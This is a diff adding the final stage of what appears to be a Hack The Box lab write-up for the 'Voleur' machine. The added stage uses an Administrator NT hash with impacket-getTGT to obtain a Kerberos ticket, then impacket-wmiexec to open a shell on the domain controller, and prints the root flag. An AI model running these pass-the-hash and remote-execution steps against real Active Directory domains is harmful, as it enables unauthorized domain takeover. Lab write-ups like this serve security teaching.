@@ -1181,6 +1181,60 @@ voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
                               
 ```
 
+```
+ impacket-getTGT -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/Administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Administrator.ccache
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/voleur]
+└─$ export KRB5CCNAME=Administrator.ccache                                         
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/voleur]
+└─$ klist
+Ticket cache: FILE:Administrator.ccache
+Default principal: Administrator@VOLEUR.HTB
+
+Valid starting       Expires              Service principal
+10/06/2026 15:46:17  10/07/2026 01:46:17  krbtgt/VOLEUR.HTB@VOLEUR.HTB
+        renew until 10/07/2026 15:46:17
+
+```
+
+### Root flag
+
+```
+impacket-wmiexec voleur.htb/Administrator@DC.voleur.htb -k -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+voleur\administrator
+
+C:\>cd c:\users\Administrator
+c:\users\Administrator>cd Desktop
+c:\users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\users\Administrator\Desktop
+
+06/05/2025  03:33 PM    <DIR>          .
+06/05/2025  03:30 PM    <DIR>          ..
+01/29/2025  02:12 AM             2,308 Microsoft Edge.lnk
+10/06/2026  10:01 AM                34 root.txt
+               2 File(s)          2,342 bytes
+               2 Dir(s)   4,025,692,160 bytes free
+
+c:\users\Administrator\Desktop>type root.txt
+381c0591a11a10fcd50baaed2d4a3eaf
+
+c:\users\Administrator\Desktop>
+
+```
+
 ---
 ## Remediation
 
